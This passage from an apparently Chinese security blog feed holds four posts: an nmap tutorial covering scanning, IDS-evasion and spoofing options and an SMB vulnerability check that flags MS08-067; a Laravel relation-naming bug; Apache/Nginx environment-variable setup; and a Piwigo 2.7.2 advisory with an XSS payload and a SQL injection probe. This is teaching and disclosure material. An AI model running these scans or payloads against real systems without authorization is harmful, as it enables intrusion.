<p>使用SYN扫描,在aggressive(4)的时间模板下,探测操作系统的类型和版本,还有显示traceroute的结果,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-sS -A -T4 target</div></pre></td></tr></table></figure>

<p>`</p>
<p>使用SYN的方法对全端口进行扫描,在aggressive(4)的时间模板下,同时对开放的端口进行端口识别</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -p1-65535 -sV -sS -T4 target PS: -T代表的是扫描的时候,一些控制选项(TCP的延迟时间,探测报文之间的间隔等)的集合</div></pre></td></tr></table></figure>

<p>`</p>
<p>使用SYN扫描,在insane(5)的时间模板下,探测操作系统的类型和版本,还有显示traceroute的结果,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-sS -A -T5 target</div></pre></td></tr></table></figure>

<p>`</p>
<p>用SYN的方法对全端口进行扫描,同时对开放的端口进行端口识别,在insane(5)的时间模板下,探测操作系统的类型,还有显示traceroute的结果,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-p 1-65535 -sV -O -sS -T5 target</div></pre></td></tr></table></figure>

<p>使用SYN扫描,在insane(5)的时间模板下,探测操作系统的类型,还有显示traceroute的结果,操作系统的类型,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-sV -O -sS -T5 target</div></pre></td></tr></table></figure>

<p>使用SYN的方法对全端口进行扫描,同时对开放的端口进行端口识别,在aggressive(4)的时间模板下,探测操作系统的类型还有显示traceroute的结果,结果输出较为详细</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -v-p 1-65535 -sV -O -sS -T4 target</div></pre></td></tr></table></figure>

<p>从文件中读取需要扫描的IP列表</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -iL ip-address.txt</div></pre></td></tr></table></figure>

<p>Nmap输出格式</p>
<p>扫描的结果输出到屏幕,同时会存储一份到grep-output.txt</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sV -p 139,445 -oG grep-output.txt 10.0.1.0/24</div></pre></td></tr></table></figure>

<p>扫描结果输出为html</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sS -sV -T5 10.0.1.99 --webxml -oX - | xsltproc --output file.html</div></pre></td></tr></table></figure>

<p>Nmap扫描Netbios<br>在子网中发现开放netbios的IP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sV -v-p139,445 10.0.0.1/24</div></pre></td></tr></table></figure>

<p>扫描指定netbios的名称</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -sU --script nbstat.nse -p 137 target</div></pre></td></tr></table></figure>

<p>扫描指定的目标,同时检测相关漏洞</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 target</div></pre></td></tr></table></figure>

<p>将nmap的80端口的扫描结果,通过管道交给nikto进行扫描</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">Nmap Nikto Scan nmap -p80 10.0.1.0/24-oG - | nikto.pl -h -</div></pre></td></tr></table></figure>

<p>将nmap的80,443端口的扫描结果,通过管道交给nikto进行扫描</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">nmap -p80,443 10.0.1.0/24-oG - | nikto.pl -h -</div></pre></td></tr></table></figure>

<h2 id="Nmap参数详解">Nmap参数详解</h2>
<p>Nmap支持主机名,ip,网段的表示方式</p>
<p>例如:blah.highon.coffee, namp.org/24, 192.168.0.1;10.0.0-25.1-254</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">-iL filename                    从文件中读取待检测的目标,文件中的表示方法支持机名,ip,网段</div><div class="line">-iR hostnum                     随机选取,进行扫描.如果-iR指定为0,则是无休止的扫描</div><div class="line">--exclude host1[, host2]        从扫描任务中需要排除的主机          </div><div class="line">--exculdefile exclude_file      排除文件中的IP,格式和-iL指定扫描文件的格式相同</div></pre></td></tr></table></figure>

<p>主机发现</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-sL                     仅仅是显示,扫描的IP数目,不会进行任何扫描</div><div class="line">-sn                     ping扫描,即主机发现</div><div class="line">-Pn                     不检测主机存活</div><div class="line">-PS/PA/PU/PY[portlist]  TCP SYN Ping/TCPACK Ping/UDPPing发现</div><div class="line">-PE/PP/PM使用ICMP echo, timestamp and netmask 请求包发现主机</div><div class="line">-PO[prococol list]      使用IP协议包探测对方主机是否开启  </div><div class="line">-n/-R不对IP进行域名反向解析/为所有的IP都进行域名的反响解析</div></pre></td></tr></table></figure>

<p>扫描技巧</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-sS/sT/sA/sW/sMTCP SYN/TCPconnect()/ACK/TCP窗口扫描/TCPMaimon扫描</div><div class="line">-sU                             UDP扫描</div><div class="line">-sN/sF/sXTCP Null，FIN，and Xmas扫描</div><div class="line">--scanflags                     自定义TCP包中的flags</div><div class="line">-sI zombie host[:probeport]     Idlescan</div><div class="line">-sY/sZSCTP INIT/COOKIE-ECHO扫描</div><div class="line">-sO                             使用IP protocol 扫描确定目标机支持的协议类型</div><div class="line">-b “FTP relay host”             使用FTP bounce scan</div></pre></td></tr></table></figure>

<p>服务版本识别</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">-sV                             开放版本探测,可以直接使用-A同时打开操作系统探测和版本探测</div><div class="line">--version-intensity "level"设置版本扫描强度,强度水平说明了应该使用哪些探测报文。数值越高，服务越有可能被正确识别。默认是7</div><div class="line">--version-light                 打开轻量级模式,为--version-intensity 2的别名</div><div class="line">--version-all                   尝试所有探测,为--version-intensity 9的别名</div><div class="line">--version-trace                 显示出详细的版本侦测过程信息</div></pre></td></tr></table></figure>

<p>指定端口和扫描顺序</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">-p                      特定的端口 -p80,443 或者 -p1-65535</div><div class="line">-p U:PORT               扫描udp的某个端口, -p U:53</div><div class="line">-F                      快速扫描模式,比默认的扫描端口还少</div><div class="line">-r                      不随机扫描端口,默认是随机扫描的</div><div class="line">--top-ports "number"扫描开放概率最高的number个端口,出现的概率需要参考nmap-services文件,ubuntu中该文件位于/usr/share/nmap.nmap默认扫前1000个</div><div class="line">--port-ratio "ratio"扫描指定频率以上的端口</div></pre></td></tr></table></figure>

<p>防火墙/IDS躲避和哄骗</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">-f; --mtu value                 指定使用分片、指定数据包的MTU.</div><div class="line">-D decoy1,decoy2,ME             使用诱饵隐蔽扫描</div><div class="line">-S IP-ADDRESS                   源地址欺骗</div><div class="line">-e interface                    使用指定的接口</div><div class="line">-g/ --source-port PROTNUM       使用指定源端口  </div><div class="line">--proxies url1,[url2],...       使用HTTP或者SOCKS4的代理 </div><div class="line">--data-length NUM               填充随机数据让数据包长度达到NUM</div><div class="line">--ip-options OPTIONS            使用指定的IP选项来发送数据包</div><div class="line">--ttl VALUE                     设置IP time-to-live域</div><div class="line">--spoof-mac ADDR/PREFIX/VEBDORMAC地址伪装</div><div class="line">--badsum                        使用错误的checksum来发送数据包</div></pre></td></tr></table></figure>

<p>脚本扫描</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">-sC                             根据端口识别的服务,调用默认脚本</div><div class="line">--script=”Lua scripts”          调用的脚本名</div><div class="line">--script-args=n1=v1,[n2=v2]     调用的脚本传递的参数</div><div class="line">--script-args-file=filename     使用文本传递参数</div><div class="line">--script-trace                  显示所有发送和接收到的数据</div><div class="line">--script-updatedb               更新脚本的数据库</div><div class="line">--script-help=”Lua script”      显示指定脚本的帮助</div></pre></td></tr></table></figure>

<p>OS识别</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-O              启用操作系统检测,-A来同时启用操作系统检测和版本检测</div><div class="line">--osscan-limit  针对指定的目标进行操作系统检测(至少需确知该主机分别有一个open和closed的端口)</div><div class="line">--osscan-guess  推测操作系统检测结果,当Nmap无法确定所检测的操作系统时，会尽可能地提供最相近的匹配，Nmap默认进行这种匹配</div></pre></td></tr></table></figure>

<p>Nmap 输出</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div></pre></td><td class="code"><pre><div class="line">-oN                     将标准输出直接写入指定的文件</div><div class="line">-oX                     输出xml文件</div><div class="line">-oS                     将所有的输出都改为大写</div><div class="line">-oG                     输出便于通过bash或者perl处理的格式,非xml</div><div class="line">-oA BASENAME            可将扫描结果以标准格式、XML格式和Grep格式一次性输出</div><div class="line">-v提高输出信息的详细度</div><div class="line">-d level                设置debug级别,最高是9</div><div class="line">--reason                显示端口处于带确认状态的原因</div><div class="line">--open只输出端口状态为open的端口</div><div class="line">--packet-trace          显示所有发送或者接收到的数据包</div><div class="line">--iflist                显示路由信息和接口,便于调试</div><div class="line">--log-errors            把日志等级为errors/warings的日志输出</div><div class="line">--append-output         追加到指定的文件</div><div class="line">--resume FILENAME       恢复已停止的扫描</div><div class="line">--stylesheet PATH/URL设置XSL样式表，转换XML输出</div><div class="line">--webxml                从namp.org得到XML的样式</div><div class="line">--no-sytlesheet         忽略XML声明的XSL样式表</div></pre></td></tr></table></figure>

<p>其他nmap选项</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">-6                      开启IPv6</div><div class="line">-A                      OS识别,版本探测,脚本扫描和traceroute</div><div class="line">--datedir DIRNAME       说明用户Nmap数据文件位置</div><div class="line">--send-eth / --send-ip  使用原以太网帧发送/在原IP层发送</div><div class="line">--privileged            假定用户具有全部权限</div><div class="line">--unprovoleged          假定用户不具有全部权限,创建原始套接字需要root权限</div><div class="line">-V                      打印版本信息</div><div class="line">-h                      输出帮助</div></pre></td></tr></table></figure>

<h2 id="例子">例子</h2>
<p>整个子网检测的Netbios</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">Nmap -sV -v-p 139,445 10.0.1.0/24</div><div class="line">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-11 21:26 GMT</div><div class="line">Nmap scan report fornas.decepticons 10.0.1.12</div><div class="line">Host is up (0.014s latency).</div><div class="line">PORT STATE SERVICE VERSION</div><div class="line">139/tcpopennetbios-ssn Samba smbd 3.X (workgroup: MEGATRON)</div><div class="line">445/tcpopennetbios-ssn Samba smbd 3.X (workgroup: MEGATRON)</div><div class="line">Service detection performed. Please report any incorrect results at http://nmap.org/submit/.</div><div class="line">Nmap done: 256 IP addresses (1 hosts up) scanned in28.74 seconds</div></pre></td></tr></table></figure>

<p>Nmap 查找Netbios名称</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">nmap -sU --script nbstat.nse -p 137 10.0.1.12</div><div class="line">Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-11 21:26 GMT</div><div class="line">Nmap scan report fornas.decepticons 10.0.1.12</div><div class="line">Host is up (0.014s latency).</div><div class="line">PORT STATE SERVICE VERSION</div><div class="line">137/udpopennetbios-ns</div><div class="line">Host script results:</div><div class="line">|_nbstat: NetBIOS name: STARSCREAM, NetBIOS user: unknown, NetBIOS MAC: unknown (unknown) </div><div class="line">Nmap done: 256 IP addresses (1 hosts up) scanned in28.74 seconds</div></pre></td></tr></table></figure>

<p>如果开启Netbios服务,检查是否存在漏洞</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">nmap --script-args=unsafe=1 --script smb-check-vulns.nse -p 445 10.0.0.1</div><div class="line">Nmap scan report forie6winxp.decepticons (10.0.1.1)</div><div class="line">Host is up (0.00026s latency).</div><div class="line">PORT STATE SERVICE</div><div class="line">445/tcpopenmicrosoft-ds</div><div class="line">Host script results:</div><div class="line">| smb-check-vulns:</div><div class="line">| MS08-067: VULNERABLE</div><div class="line">| Conficker: Likely CLEAN</div><div class="line">| regsvc DoS: NOT VULNERABLE</div><div class="line">| SMBv2 DoS (CVE-2009-3103): NOT VULNERABLE</div><div class="line">|_ MS07-029: NO SERVICE (the Dns Server RPC service is inactive)</div></pre></td></tr></table></figure>

<p>Nmap done: 1 IP address (1 host up) scanned in5.45 seconds<br>根据扫描结果,发现存在MS08-067漏洞</p>
]]></content>
    <summary type="html">
    <![CDATA[nmap中文使用教程]]>
    
    </summary>
    
      <category term="技术文章" scheme="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Laravel关联模型由于名称一致性导致的BUG问题]]></title>
    <link href="http://www.weshell.net/laravel-chace.html"/>
    <id>http://www.weshell.net/laravel-chace.html</id>
    <published>2015-01-04T13:17:16.000Z</published>
    <updated>2015-01-09T05:53:20.000Z</updated>
    <content type="html"><![CDATA[<h2 id="容易犯错的位置">容易犯错的位置</h2>
<p>最容易犯错的代码是这样的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">MyPost::with(‘myPostInfo’)-&gt;get();</div></pre></td></tr></table></figure>

<p>在使用With去eagerLoad关联模型时，必须使用和定义方法同名的key去读取，那么这样读取出来的方法只能是Camel Case的key。其他地方就只能用</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">$my_post-&gt;myPostInfo;</div></pre></td></tr></table></figure>

<p>来保证不出问题。</p>
<h2 id="toArray()_方法失效">toArray() 方法失效</h2>
<p>如果同时使用了两者，另外一个问题就是导致Model::toArray()失效。因为toArray()方法首先去relations中查找Snake Case命名的关联模型，没有的话才去看Camel Case的。<br>所以如果用到了toArray()方法来转换Model，切忌同时使用两者。</p>
<h2 id="定义关联模型">定义关联模型</h2>
<p>在Laravel里面，我们可以通过定义以下Model来完成关联查询。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">class MyPost extends Eloquent {</div><div class="line">    public function myPostInfo () {</div><div class="line">        return $this-&gt;hasOne('MyPostInfo');</div><div class="line">    }</div><div class="line">}</div><div class="line">class MyPostInfo extends Eloquent {}</div></pre></td></tr></table></figure>

<h2 id="使用关联模型">使用关联模型</h2>
<p>这里myPostInfo()用的是Camel命名规则，但是我们在读取某一个PostInfo的时候可以用Snake规则。如下面代码都是可行的：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">$post = MyPost::find(1);</div><div class="line">$post_info = $post-&gt;myPostInfo; // example 1</div><div class="line">$post_info = $post-&gt;my_post_info; // example 2</div><div class="line">Laravel允许上述两种方法，但是没有合理的处理使用两种命名造成的冲突。</div></pre></td></tr></table></figure>

<h2 id="缓存失效">缓存失效</h2>
<p>如果我们同时使用了上述两个例子，就会使其中一个缓存失效。在Model的relations变量中，缓存了已经读取过的关联Model，但是当我们用不同规则的名字去读取的时候，却会使得前一个缓存失效。例如</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">$post_info = $post-&gt;myPostInfo; </div><div class="line">// $post-&gt;relations = [‘myPostInfo’ =&gt; ..];</div><div class="line"></div><div class="line">$post_info = $post-&gt;my_post_info;</div><div class="line">// $post-&gt;relations = [‘myPostInfo’ =&gt; …, ‘my_post_info’ =&gt; …];</div></pre></td></tr></table></figure>

<p>所以如果不希望缓存失效，得在项目中只使用一种命名方法去读取关系模型。Laravel推荐的是Camel Case.</p>
]]></content>
    <summary type="html">
    <![CDATA[这里myPostInfo()用的是Camel命名规则，但是我们在读取某一个PostInfo的时候可以用Snake规则。如下面代码都是可行的]]>
    
    </summary>
    
      <category term="技术文章" scheme="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PHP设置服务器Apache/Nginx环境变量]]></title>
    <link href="http://www.weshell.net/php-for-var.html"/>
    <id>http://www.weshell.net/php-for-var.html</id>
    <published>2015-01-04T13:17:16.000Z</published>
    <updated>2015-01-09T06:06:52.000Z</updated>
    <content type="html"><![CDATA[<h2 id="设置Apache环境变量">设置Apache环境变量</h2>
<h3 id="指令">指令</h3>
<p>设置当前环境变量为DEV</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">SetEnv RUNTIME_ENVIROMENT DEV</div></pre></td></tr></table></figure>

<p>数据库帐号密码</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">SetEnv MYSQL_USERNAME root</div><div class="line">SetEnv MYSQL_PASSWORD root</div></pre></td></tr></table></figure>

<p>配置文件格式</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;VirtualHost *:<span class="number">80</span>&gt;</div><div class="line">    ServerAdmin admin@admin.com</div><div class="line">    DocumentRoot <span class="string">"/var/www/"</span></div><div class="line">    ServerName localhost</div><div class="line">    SetEnv RUNTIME_ENVIROMENT DEV</div><div class="line">    SetEnv MYSQL_USERNAME root</div><div class="line">    SetEnv MYSQL_PASSWORD root</div><div class="line">    ErrorLog <span class="string">"logs/error.log"</span></div><div class="line">    CustomLog <span class="string">"logs/access.log"</span> common</div><div class="line">&lt;/VirtualHost&gt;</div></pre></td></tr></table></figure>

<h2 id="设置Nginx环境变量">设置Nginx环境变量</h2>
<h3 id="指令-1">指令</h3>
<p>设置当前环境变量为DEV</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">fastcgi_param RUNTIME_ENVIROMENT <span class="string">'DEV'</span></div></pre></td></tr></table></figure>

<p>数据库帐号密码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">fastcgi_param MYSQL_USERNAME <span class="string">'root'</span></div><div class="line">fastcgi_param MYSQL_PASSWORD <span class="string">'root'</span></div></pre></td></tr></table></figure>

<h3 id="配置文件格式">配置文件格式</h3>
<p>在fastcgi_params文件中配置</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">fastcgi_param RUNTIME_ENVIROMENT <span class="string">'DEV'</span>;</div><div class="line">fastcgi_param MYSQL_USERNAME <span class="string">'root'</span>;</div><div class="line">fastcgi_param MYSQL_PASSWORD <span class="string">'root'</span>;</div></pre></td></tr></table></figure>

<h3 id="在nginx-conf中配置">在nginx.conf中配置</h3>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">server {</div><div class="line">    listen   <span class="number">80</span>; </div><div class="line">    root /<span class="keyword">var</span>/www;</div><div class="line">    index index.php;</div><div class="line">    server_name localhost;</div><div class="line">    location /</div><div class="line">    {   </div><div class="line">         index index.php;</div><div class="line">    }   </div><div class="line">      </div><div class="line">    location ~ .*\.(php|php5)?$ {</div><div class="line">        fastcgi_pass <span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">9000</span>;</div><div class="line">        fastcgi_index index.php;</div><div class="line">        <span class="keyword">include</span> fastcgi_params;</div><div class="line">    }   </div><div class="line">}</div></pre></td></tr></table></figure>

<h2 id="为PHP脚本设置环境变量">为PHP脚本设置环境变量</h2>
<h3 id="为当前用户临时设置">为当前用户临时设置</h3>
<p>临时设置只需要执行</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">export KEY=VALUE</div></pre></td></tr></table></figure>

<h3 id="为当前用户永久设置">为当前用户永久设置</h3>
<p>在~/.bashrc（不同系统各有不同）中写</p>
<h3 id="为所有用户不包括root设置">为所有用户不包括root设置</h3>
<p>创建文件/etc/profile.d/test.sh，写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KEY=VALUE</div></pre></td></tr></table></figure>

<h3 id="为所有用户包括root设置">为所有用户包括root设置</h3>
<p>在/etc/environment中写入</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">KEY=VALUE</div></pre></td></tr></table></figure>

<p>php<br>注意，这个文件的生效时间是用户登录时，所以对于root来说，需要重启机器</p>
<h3 id="在Supervisor中设置">在Supervisor中设置</h3>
<p>有的时候PHP脚本是用Supervisor来控制的，所以记得设置supervisor配置中的environment项</p>
<h2 id="PHP中调用服务器环境变量">PHP中调用服务器环境变量</h2>
<p>在PHP中有两个调用方式：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="variable">$env</span> = getenv(<span class="string">'RUNTIME_ENVIROMENT'</span>);</div><div class="line">还有超全局变量方式：</div><div class="line"></div><div class="line"><span class="variable">$env</span> = <span class="variable">$_SERVER</span>[<span class="string">'RUNTIME_ENVIROMENT'</span>];</div></pre></td></tr></table></figure>

]]></content>
    <summary type="html">
    <![CDATA[设置环境变量常见的地方为区分开发环境/生产环境，或者定义一些数据库的帐号密码]]>
    
    </summary>
    
      <category term="技术文章" scheme="http://www.weshell.net/categories/%E6%8A%80%E6%9C%AF%E6%96%87%E7%AB%A0/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[Piwigo SQL注入及跨站脚本漏洞]]></title>
    <link href="http://www.weshell.net/Piwigo-SQL-xss.html"/>
    <id>http://www.weshell.net/Piwigo-SQL-xss.html</id>
    <published>2015-01-03T13:17:16.000Z</published>
    <updated>2015-01-03T11:31:52.000Z</updated>
    <content type="html"><![CDATA[<h3 id="0"><span class="label label-danger">漏洞标题：PiwigoSQL注入及跨站脚本漏洞</span></h3>
<h3 id="1"><span class="label label-danger">受影响版本：Piwigo2.7.2</span></h3>
<h3 id="2"><span class="label label-danger">有无利用方法：是</span></h3>
<p><br></p>
<h3 id="利用代码[XSS]：">利用代码[XSS]：</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="title">fieldset</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">legend</span>&gt;</span>Add Group<span class="tag">&lt;/<span class="title">legend</span>&gt;</span><span class="tag">&lt;<span class="title">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">strong</span>&gt;</span>Name Group<span class="tag">&lt;/<span class="title">strong</span>&gt;</span><span class="tag">&lt;<span class="title">br</span>&gt;</span></div><div class="line">YOUR GROUP NAME O POC</div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"text"</span> <span class="attribute">size</span>=<span class="value">"20"</span> <span class="attribute">maxlength</span>=<span class="value">"50"</span> <span class="attribute">name</span>=<span class="value">"groupname"</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">p</span> <span class="attribute">class</span>=<span class="value">"actionButtons"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"submit"</span> <span class="attribute">value</span>=<span class="value">"Add"</span> <span class="attribute">name</span>=<span class="value">"submit_add"</span> <span class="attribute">class</span>=<span class="value">"submit"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">a</span> <span class="attribute">id</span>=<span class="value">"addGroupClose"</span> <span class="attribute">href</span>=<span class="value">"#"</span>&gt;</span>Cancel<span class="tag">&lt;/<span class="title">a</span>&gt;</span><span class="tag">&lt;/<span class="title">p</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="title">input</span> <span class="attribute">type</span>=<span class="value">"hidden"</span> <span class="attribute">value</span>=<span class="value">"24322c55681c00da423a8a7b21b79640"</span> <span class="attribute">name</span>=<span class="value">"pwg_token"</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="title">fieldset</span>&gt;</span></div><div class="line"></div><div class="line">#P0c</div><div class="line">"&gt;<span class="tag">&lt;<span class="title">img</span> <span class="attribute">src</span>=<span class="value">x</span> <span class="attribute">onerror</span>=<span class="value">prompt(1);</span>&gt;</span></div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/qFyJz6q.jpg" alt="XSS测试"></p>
<h3 id="利用代码[SQL注入]">利用代码[SQL注入]</h3>
<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line">#P0c</div><div class="line">http://site.com/piwigo/admin.php?page=history&search_id=5'</div><div class="line"></div><div class="line">SELECT</div><div class="line">    date,</div><div class="line">    time,</div><div class="line">    user_id,</div><div class="line">    IP,</div><div class="line">    section,</div><div class="line">    category_id,</div><div class="line">    tag_ids,</div><div class="line">    image_id,</div><div class="line">    image_type</div><div class="line">  FROM ucea_history</div><div class="line">  WHERE </div><div class="line">; in /home/site.com/public_html/piwigo/include/dblayer/functions_mysqli.inc.php on line 830</div></pre></td></tr></table></figure>

<p><img src="http://i0yy.qiniudn.com/wpzMmmu.jpg" alt="SQL注入测试"></p>
]]></content>
    <summary type="html">
    <![CDATA[Piwigo SQL注入及跨站脚本漏洞以及漏洞利用方法]]>
    
    </summary>
    
      <category term="漏洞仓库" scheme="http://www.weshell.net/categories/%E6%BC%8F%E6%B4%9E%E4%BB%93%E5%BA%93/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[PMB 4.1.3 SQL注入漏洞]]></title>
